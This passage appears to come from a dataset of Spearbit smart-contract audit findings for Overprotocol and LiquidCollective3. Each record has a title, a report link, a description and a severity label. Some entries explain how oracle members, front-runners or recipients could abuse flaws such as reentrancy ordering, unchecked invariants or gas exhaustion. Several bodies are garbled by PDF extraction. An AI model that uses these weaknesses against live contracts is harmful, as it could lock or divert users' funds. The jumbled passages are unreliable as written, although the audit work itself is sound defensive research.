        "body": "Clients that do now know their correct SourceEpoch will be unable to generate a ResotrationProof and will have to revert to 3rd prty data sources to learn what their correct SourceEpoch should be. This is due to the fact that there is no way for them to request their current EpochCoverage from a restoration server and the error returned when they use the incorrect SourceEpoch does not tell them what the correct epoch is. This goes against the assumption that Over Protocol clients should not need to keep the entire state in order to participate in the network.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Performance optimization in RestorationTX verification",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "In trie.VerifyProof, there is a call to decodeNode. The comments indicate that it isn't fully perfor- mant: // decodeNode parses the RLP encoding of a trie node. It will deep-copy the passed // byte slice for decoding, so it s safe to modify the byte slice afterwards. The- // decode performance of this function is not optimal, but it is suitable for most // scenarios with low performance requirements and hard to determine whether the // byte slice be modified or not.  Since this VerifyProof call is in the evm, I think it qualifies for needing to be performant code. The current It may be worth creating a different usage of VerifyProof does not ever modify the data in the returned slice. VerifyProofUnsafe function that does not use the deepcopy and would instead call decodeNodeUnsafe. This would mean that the input slice and the output slice will end up sharing memory, so modifying one will modify the other. Therefore there would be an expectation that the input slice and the output slice are not modified and are treated as read-only. According the the benchmarks performed in this comment, this will increase the performance of calls to the Veri- fyProof by ~6.6% on average.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Outdated docstring for BlockChainAPI#GetEpochByNumber",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "This function's docstring is for GetHeaderByNumber and GetHeaderByNumber is missing a docstring.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent field ordering for Trie ID structure",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "The order of these fields are inconsistent. For example: // StorageTrieID constructs an identifier for storage trie which ... // state and contract specified by the stateRroot and owner. func StorageTrieID(stateRoot common.Hash, epoch uint32, owner common.Owner, root common.Root) *ID { return &ID{ StateRoot: stateRoot, Epoch: Owner: Root: epoch, owner, root, } } 9 and // TrieID constructs an identifier for a standard trie (not a secondary ... // with provided root. It func TrieID(root common.Hash) *ID { s msotly used in tests and some other ...  return &ID{ StateRoot: root, Owner: Root: Epoch: common.Hash{}, root, 0, } }",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unnecessary read/write locks in BlobPool accessors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "In EpochCoverage, Nonce, and Stats we use a read/write lock when we could use a read lock.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Misleading comment about base fee being burned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "It appears that the base fee is sent to the OverProtocol treasury instead of being burned. The In my opinion, this should be clearly comment says that the base fee is burned, but this isn't technically true. advertised somewhere too.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Unhandled errors when using abi.NewType",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "In createContractWithUiHash#Run and create2ContractWithUiHash#Run, we do not handle the potential errors when using abi.NewType. I wouldn't actually expect these to fail, but I suggest always handling errors.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "New ErrInsufficientFee error is unused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "There's a new error, ErrInsufficientFee, which was used before but isn't anymore.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing nil check for header",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Overprotocol-Spearbit-Security-Review-June-2024.pdf",
        "body": "In verifyRestorationProof, when getting the block root hash, we do not check if the header is nil. If for some reason this is nil, it will panic when accessing the Root field. GetHeaderByNumber could theoretically return nil, but I'm pretty sure prior checks in verifyRestorationProof will prevent this. Better to be safe though.",
        "labels": [
            "Spearbit",
            "Overprotocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "_pickNextValidatorsToExitFromActiveOperators uses the wrong index to query stopped validator count for operators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "operators does not necessarily have the same order as the actual OperatorsV2's operators, since the ones that don't have _hasExitableKeys will be skipped (the operator might not be active or all of its funded keys might have been requested to exit). And so when querying the stopped validator counts for (uint256 idx = 0; idx < exitableOperatorCount;) { uint32 currentRequestedExits = operators[idx].requestedExits; uint32 currentStoppedCount = _getStoppedValidatorsCountFromRawArray(stoppedValidators, idx); one should not use the idx in the cached operator's array, but the cached index of this array element, as the indexes of stoppedValidators correspond to the actual stored operator's array in storage. Note that when emitting the UpdatedRequestedValidatorExitsUponStopped event, the correct index has been used.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "Oracles' reports votes are not stored in storage",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The purpose of Oracle.1.sol is to facilitate the reporting and quorum of oracles. Oracles period- ically add their reports and when consensus is reached the setConsensusLayerData function (which is a critical component of the system) is called. However, there is an issue with the current implementation as ReportVari- ants holds the reports made by oracles but ReportVariants.get() returns a memory array instead of a storage array, therefore resulting in an increase in votes that will not be stored at the end of the transaction and prevent- ing setConsensusLayerData from being called. This is a regression bug that should have been detected by a comprehensive test suite.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Critical Risk"
        ]
    },
    {
        "title": "User's LsETH might be locked due to out-of-gas error during recursive calls",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Let W0, W1, ...W7 represent the withdrawal events in the withdrawal stack. Let R0, R1, R2 represent the users' redeem requests in the redeem queue. Assume that Alice is the owner of R1. When Alice called the resolveRedeemRequests function against R1, it will resolve to W 1. Next, Alice called the _claimRedeemRequest function with R1 and its corresponding W 1. The _claimRedeemRequest will first process W 1. At the end of the function, it will check if W 1 matches all the amounts of R1. If not, it will call the _claimRedeemRequest function recursively with the same request id (R1) but increment the withdrawal event id (W2 = W1 + 1). The _claimRedeemRequest function recursively calls itself until all the amount of redeem request is \"expended\" or the next withdrawal event does not exist. In the above example, the _claimRedeemRequest will be called 7 times with W1...W7, until all the amount of R1 is \"expended\" (R1.amount == 0) However, if the amount of a redeem request is large (e.g. 1000 LsETH), and this redeem request is satisfied by many small chunks of withdrawal events (e.g. one withdrawal event consists of less than 10 LsETH), then the recursion depth will be large. The function will keep calling itself recursively until an out-of-gas error happens. If this happens, there is no way to claim the redemption request, and the user's LsETH will be locked. In the current implementation, users cannot break the claim into smaller chunks to overcome the gas limit. In the above example, if Alice attempts to break the claim into smaller chunks by first calling the _claimRedeemRequest function with R1 and its corresponding W5, the _isMatch function within it will revert.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Allowed users can directly transfer their share to RedeemManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "An allowed user can directly transfer its shares to the RedeemManager without requesting a redeem. This would cause the withdrawal stack to grow, since the redeem demand (2) which is calculated based on the RedeemManager's share of LsETH increases. RedeemQueue would be untouched in this case. In case of an accidental mistake by a user, the locked shares can only be retrieved by a protocol update.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Invariants are not enforced for stopped validator counts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "_setStoppedValidatorCounts does not enforce the following invariants:  stoppedValidatorCounts[0] <= DepositedValidatorCount.get()  stoppedValidatorCounts[i] needs to be a non-decreasing function when viewed on a timeline  stoppedValidatorCounts[i] needs to be less than or equal to the funded number of validators for the corresponding operator. Currently, the oracle members can report values that would break these invariants. As a consequence, the oracle members can signal the operators to exit more or fewer validators by manipulating the preExitingBalance value. And activeCount for exiting validators picking algorithm can also be manipulated per operator.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Potential out of gas exceptions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The purpose of _requestExitsBasedOnRedeemDemandAfterRebalancings is to release liquidity for withdrawals made in the RedeemManager contract. The function prioritizes liquidity sources, starting with Balance- ToRedeem and then BalanceToDeposit, before asking validators to exit. However, if the validators are needed to release more liquidity, the function uses pickNextValidatorsToExit to determine which validators to ask to exit. This process can be quite gas-intensive, especially if the number of validators is large. The gas consumption of this function depends on several factors, including exitableOperatorCount, stoppedVal- idators.length, and the rate of decrease of _count. These factors may increase over time, and the msg.sender does not have control over them. The function includes two nested loops that contribute to the overall gas con- sumption, and this can be problematic for certain inputs. For example, if the operators array has no duplications and the difference between values is exactly 1, such as [n, n-1, n-2 ... n-k] where n can be any number and k is a large number equals exitableOperatorCount - 1 and _count is also large, the function can become extremely gas-intensive. The main consequence of such a potential issue is that the function may not release enough liquidity to the RedeemManager contract, resulting in partial fulfillment of redemption requests. Similarly, _pickNextValidatorsToDepositFromActiveOperators is also very gas intensive. If the number of de- sired validators and current operators (including fundable operators) are high enough, depositToConsensusLayer is no longer callable.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The validator count to exit in _requestExitsBasedOnRedeemDemandAfterRebalancings assumes that the to-be selected validators are still active and have not been penalised.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The validatorCountToExit is calculated as follows uint256 validatorCountToExit = LibUint256.ceil( redeemManagerDemandInEth - (availableBalanceToRedeem + exitingBalance + preExitingBalance), DEPOSIT_SIZE ); This formula assumes that the to-be selected validators exit by the pickNextValidatorsToExit are: 1. Still active 2. Have not been queued to be exited and 3. Have not been penalized and their balance is at least MAX_EFFECTIVE_BALANCE",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Burn RedeemManager's share first before calling its reportWithdraw endpoint",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "reportWithdraw and then burns the corresponding shares for the RedeemManager The current implementation of _reportWithdrawToRedeemManager calls RedeemManager's // perform a report withdraw call to the redeem manager redeemManager_.reportWithdraw{value: suppliedRedeemManagerDemandInEth}(suppliedRedeemManagerDemand); // we burn the shares of the redeem manager associated with the amount of eth provided _burnRawShares(address(RedeemManagerAddress.get()), suppliedRedeemManagerDemand);",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OracleManager allows reporting for the same epoch multiple times, leading to unknown behavior.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Currently, it is possible for the oracle to report on the same epoch multiple times, because _- isValidEpoch checks that the report's epoch >= LastConsensusLayerReport.get().epoch. This can lead the contract to unspecified behavior  The code will revert if the report increases the balance, not with an explicit check but reverting due to a subtraction underflow, since maxIncrease == 0 and  Allowing other code paths to execute to completion.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Missing event emit when user calls deposit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Whenever BalanceToDeposit is updated, the protocol should emit a SetBalanceToDeposit, but when a user calls UserDepositManager.deposit, the event is never emitted which could break tooling.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Reset the report data and increment the last epoch id before calling River's setConsensusLayerData when a quorum is made",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The current implementation of reportConsensusLayerData calls river.setConsensusLayerData(report) first when a quorum is made then resets the report variant and position data and also it increment the last epoch id afterward // if adding this vote reaches quorum if (variantVotes + 1 >= quorum) { // we push the report to river river.setConsensusLayerData(report); // we clear the reporting data _clearReports(); // we increment the lastReportedEpoch to force reports to be on the last frame LastEpochId.set(lastReportedEpochValue + 1); emit SetLastReportedEpoch(lastReportedEpochValue + 1); } In the future version of the protocol there might be a possibility for an oracle member to call back into reportCon- sensusLayerData when river.setConsensusLayerData(report) is called and so it would open a reentrancy for compromised/malicious oracle members.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Update BufferedExceedingEth before calling sendRedeemManagerExceedingFunds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "In pullExceedingEth , River's sendRedeemManagerExceedingFunds is called before updating the RedeemManager's BufferedExceedingEth storage value _river().sendRedeemManagerExceedingFunds{value: amountToSend}(); BufferedExceedingEth.set(BufferedExceedingEth.get() - amountToSend);",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Any oracle member can censor almost quorum report variants by resetting its address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The admin or an oracle member can DoS or censor almost quorum reports by calling setMember endpoint which would reset the report variants and report positions. The admin also can reset the/clear the reports by calling other endpoints by that should be less of an issue compared to just an oracle member doing that.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Incentive mechanism that encourages operators to respond quickly to exit requests might diminish under certain condition",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "/// @notice Retrieve all the active and fundable operators /// @dev This method will return a memory array of length equal to the number of operator, but /// @dev populated up to the fundable operator count, also returned by the method /// @return The list of active and fundable operators /// @return The count of active and fundable operators function getAllFundable() internal view returns (CachedOperator[] memory, uint256) { // uint32[] storage stoppedValidatorCounts = getStoppedValidators(); for (uint256 idx = 0; idx < operatorCount;) { _hasFundableKeys(r.value[idx]) && _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits only @audit-ok File: Operators.2.sol 153: 154: ,! 155: 156: 157: 158: ,! ..SNIP.. 172: 173: 174: 175: 176: 177: ,! 178: if ( ) { r.value[idx].requestedExits is the accumulative number of requested validator exits by the protocol _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) function is a value reported by oracle members which consist of both exited and slashed validator counts It was understood the rationale of having the _getStoppedValidatorCountAtIndex(stoppedValidatorCounts, idx) >= r.value[idx].requestedExits conditional check at Line 177 above is to incentivize operators to re- In other words, an operator with a re- spond quickly to exit requests if they want new stakes from deposits. questedExits value larger than the _getStoppedValidatorCountAtIndex count indicates that an operator did not submit exit requests to the Consensus Layer (CL) in a timely manner or the exit requests have not been finalized in CL. However, it was observed that the incentive mechanism might not work as expected in some instances. Consider the following scenario: Assuming an operator called A has 5 slashed validators and 0 exited validators, the _getStoppedValidator- CountAtIndex function will return 5 for A since this function takes into consideration both stopped and slashed validators. Also, assume that the requestedExits of A is 5, which means that A has been instructed by the protocol to submit 5 exit requests to CL. In this case, the incentive mechanism seems to diminish as A will still be considered a fundable operator even if A does not respond to exit requests since the number of slashed validators is enough to \"help\" to push up the stopped validator count to satisfy the condition, giving the wrong impression that A has already submitted the exit requests. As such, A will continue to be selected to stake new deposits.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "RedeemManager. _claimRedeemRequests transaction sender might be tricked to pay more eth in trans- action fees",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The _claimRedeemRequests function is designed to allow anyone to claim ETH on behalf of another party who has a valid redeem request. The function iterates through the redeemRequestIds list and fulfills each request individually. However, it is important to note that the transfer of ETH to the recipients is only limited by the 63/64 rule, which means that it is possible for a recipient to take advantage of a heavy fallback function and potentially cause the sender to pay a significant amount of unwanted transaction fees.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Claimable LsETH on the Withdraw Stack could exceed total LsETH requested on the Redeem Queue",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Let the total amount of claimable LsETH on the Withdraw Stack be x and the total amount of LsETH requested on the Redeem Queue be y. The following points are extracted from the Withdrawals Smart Contract Architecture documentation:  The design ensures that x <= y . Refer to page 15 of the documentation.  It is impossible for a redeem request to be claimed before at least one Oracle report has occurred, so it is impossible to skip a slashing time penalty. Refer to page 16 of the documentation. Based on the above information, the main purpose of the design (x <= y) is to avoid favorable treatment of LsETH holders that would request a redemption before others following a slashing incident. However, this constraint (x <= y ) is not being enforced in the contract. The reporter could continue to report withdrawal via the RedeemManager.reportWithdraw function till the point x > y. If x > y, LsETH holders could request a redemption before others following a slashing incident to gain an advan- tage.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "An oracle member can resubmit data for the same epoch multiple times if the quorum is set to 1",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "If the quorum is set to 1 and the difference between the report's epoch e and LastEpochId.get() is (cid:1)e, an oracle member will be able to call reportConsensusLayerData (cid:1)e + 1 times to push its report for epoch e to the protocol and with different data each time (only restriction on successive reports is that the difference of underlying balance between reports would need to be negative since the maxIncrease will be 0). Note that in reportConsensusLayerData the first storage write to LastEpochId will be overwritten later due to quorum of one: x = LastEpochId -> report.epoch -> x + 1",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Report's validatorsCount's historical non-decreseness does not get checked",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Once the Oracle members come to a quorum for a selected report variant, the validators count is stored in the storage. Note that validatorsCount is supposed to represent the total cumulative number of validators ever funded on consensus layer (even if they have been slashed or exited at some point ). So this value is supposed to be a non-decreasing function of reported epochs. But this invariant has never been checked in setConsensusLayerData.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The report's slashingContainmentMode and bufferRebalancingMode are decided by the oracle mem- bers which affects the exiting strategy of validators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The current protocol leaves it up to the oracle members to come to a quorum to set either of the report.slashingContainmentMode or report.bufferRebalancingMode to true or false. That means the oracle members have the power to decide off-chain whether validators should be exited and whether some of the deposit balance should be reallocated for redeeming (vs an algorithmic decision by the protocol on-chain). A potential bad scenario would be oracle members deciding to not signal for new validators to exit and from the time for the current epoch to the next report some validators get penalized or slashed which would reduce the If those validators would have exited before getting slashed or penalized, the underlying value of the shares. redeemers would have received more ETH back for their investment.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Anyone can call depositToConsensusLayer and potentially push wrong data on-chain. An example is when an operator would want to remove a validator key that is not-funded yet but has an index below the operator limit and will be picked by the strategy if depositToConsensusLayer is called. Then anyone can front run the removal call by the operator and force push this validator's info to the deposit contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Calculation of currentMaxCommittableAmount can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "currentMaxCommittableAmount is calculated as: // we adapt the value for the reporting period by using the asset balance as upper bound uint256 underlyingAssetBalance = _assetBalance(); uint256 currentBalanceToDeposit = BalanceToDeposit.get(); ... uint256 currentMaxCommittableAmount = LibUint256.min( LibUint256.min(underlyingAssetBalance, (currentMaxDailyCommittableAmount * period) / 1 days), currentBalanceToDeposit ); But underlyingAssetBalance is Bu = Bv +Bd +Bc +Br +32(Cd (cid:0)Cr ) which is greater than currentBalanceToDeposit Bd since the other components are non-negative values. parameter description Bv Bd Bc Br Cd Cr M m Bu LastConsensusLayerReport.get().validatorsBalance BalanceToDeposit.get() CommittedBalance.get() BalanceToRedeem.get() DepositedValidatorCount.get() LastConsensusLayerReport.get().validatorsCount currentMaxCommittableAmount currentMaxDailyCommittableAmount * period) / 1 days underlyingAssetBalance Note that the fact that Cd (cid:21) Cr is an invariant that is enforced by the protocol. and so currently we are computing M as: M = min(Bu, Bd , m) = min(Bd , m) since Bu (cid:21) Bd .",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Remove redundant array length check and variable to save gas.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "When someone calls ConsensusLayerDepositManager.depositToConsensusLayer, the contract will verify that the receivedSignatureCount matches the receivedPublicKeyCount returned from _getNextVal- idators. This is unnecessary as the code always creates them with the same length.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Duplicated events emitted in River and RedeemManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The amount of ETH pulled from the redeem contract when setConsensusData is called by the oracle is notified with events in both RedeemManager and River contracts.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "totalRequestedExitsValue's calculation can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "In the for loop in this context, totalRequestedExitsValue is updated for every operator that sat- isfies _getActiveValidatorCountForExitRequests(operators[idx]) == highestActiveCount. Based on the used increments, their sum equals to optimalTotalDispatchCount.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Report's bufferRebalancingMode and slashingContainmentMode are only used during the reporting transaction process",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "report.bufferRebalancingMode and report.slashingContainmentMode are only used during the transaction and their previous values are not used in the protocol. They can be removed from being added to the stored report. Note that their historical values can be queried by listening to the ProcessedConsensusLayerReport(report, vars.trace) events.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Add more comments/documentation for ConsensusLayerReport and StoredConsensusLayerReport structs",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "The ConsensusLayerReport and StoredConsensusLayerReport structs are defined as /// @notice The format of the oracle report struct ConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; uint32[] stoppedValidatorCountPerOperator; bool bufferRebalancingMode; bool slashingContainmentMode; } /// @notice The format of the oracle report in storage struct StoredConsensusLayerReport { uint256 epoch; uint256 validatorsBalance; uint256 validatorsSkimmedBalance; uint256 validatorsExitedBalance; uint256 validatorsExitingBalance; uint32 validatorsCount; bool bufferRebalancingMode; bool slashingContainmentMode; } Comments regarding their specified fields are lacking.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "postUnderlyingBalanceIncludingExits and preUnderlyingBalanceIncludingExits can be removed from setConsensusLayerData",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "Both postUnderlyingBalanceIncludingExits ( Bpost ) and preUnderlyingBalanceIncludingEx- its ( Bpre ) include the accumulated skimmed and exited amounts overtime which part of them might have exited the protocol through redeeming (or skimmed back to CL and penalized). Their delta is almost the same as the delta of vars.postReportUnderlyingBalance and vars.preReportUnderlyingBalance (almost if one adds a check for non-decreases of validator counts). u u : postUnderlyingBalanceIncludingExits u : preUnderlyingBalanceIncludingExits u (cid:0) Bpre u : vars.postReportUnderlyingBalance : vars.preReportUnderlyingBalance : Breport,post (cid:0) Breport,pre u u  Bpost u  Bpre  (cid:1)Bu: Bpost  Breport,post  Breport,pre u  (cid:1)Breport u  Bprev v : u  Bcurr v  (cid:1)Bv : Bcurr  Bprev s  Bcurr s  (cid:1)Bs: Bcurr  Bprev e  Bcurr e  (cid:1)Be: Bcurr previous reported/stored value for total validator balances in CL LastConsensusLayerRe- port.get().validatorsBalance v (cid:0) Bprev v (can be negative) : current reported value of total validator balances in CL report.validatorsBalance : LastConsensusLayerReport.get().validatorsSkimmedBalance : report.validatorsSkimmedBalance s (cid:0) Bprev s (always non-negative, this is an invariant that gets checked). : LastConsensusLayerReport.get().validatorsExitedBalance : report.validatorsExitedBalance e (cid:0) Bprev e (always non-negative, this is an invariant that gets checked).  $C{prev} $: LastConsensusLayerReport.get().validatorsCount  Ccurr : report.validatorsCount  (cid:1)C: Ccurr (cid:0) Cprev (this value should be non-negative, note this invariant has not been checked in the code- base)  Cdeposit : DepositedValidatorCount.get()  Bd : BalanceToDeposit.get() 22  Bc: CommittedBalance.get()  Br : BalanceToRedeem.get() Note that the above values are assumed to be in their form before the current report gets stored in the storage. Then we would have Bpost u = Bcurr v + Bcurr s + Bcurr e = Bpre u + (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C and so: (cid:1)Bu = (cid:1)Bv + (cid:1)Bs + (cid:1)Be (cid:0) 32(cid:1)C = (cid:1)Breport u",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "The formula or the parameter names for calculating currentMaxDailyCommittableAmount can be made more clear",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "currentMaxDailyCommittableAmount is calculated using the below formula: // we compute the max daily committable amount by taking the asset balance without the balance to deposit into account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); Therefore its value is the maximum of two potential maximum values.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "preExitingBalance is a rough estimate for signalling the number of validators to request to exit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "exitingBalance and preExitingBalance might be trying to compensate for the same portion of balance (non-stopped validators which have been signaled to exit and are in the CL exit queue). That means the number of validatorCountToExit calculated to accommodate for the redeem demand is actually lower than what is required. The important portion of preExitingBalance is for the validators that were singled to exit in the previous reporting round but the operators have not registered them for exit in CL. Also totalStoppedValidatorCount can include slashed validator counts which again lowers the required validatorCountToExit and those values should not be accounted for here. Perhaps the oracle members should also report the slashing counts of validators so that one can calculate these values more accurately.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "More documentation can be added regarding the currentMaxDailyCommittableAmount calculation",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective3-Spearbit-Security-Review.pdf",
        "body": "currentMaxDailyCommittableAmount calculated as // we compute the max daily committable amount by taking the asset balance without the balance to deposit into the account ,! uint256 currentMaxDailyCommittableAmount = LibUint256.max( dcl.maxDailyNetCommittableAmount, (uint256(dcl.maxDailyRelativeCommittableAmount) * (underlyingAssetBalance - ,! currentBalanceToDeposit)) / LibBasisPoints.BASIS_POINTS_MAX ); We can add further to the comment: Since before the _commitBalanceToDeposit hook is called we have skimmed the remaining to redeem balance to BalanceToDeposit, underlyingAssetBalance - currentBalanceToDeposit represent the funds allocated for CL (funds that are already in CL, funds that are in transit to CL or funds committed to be deposited to CL). It is important that the redeem balance is already skimmed for this upper bound calculation, so for future code changes we should pay attention to the order of hook callbacks otherwise the upper bounds would be different.",
        "labels": [
            "Spearbit",
            "LiquidCollective3",
            "Severity: Informational"
        ]
    },
    {
        "title": "BalanceToRedeem is only non-zero during a report processing transaction",
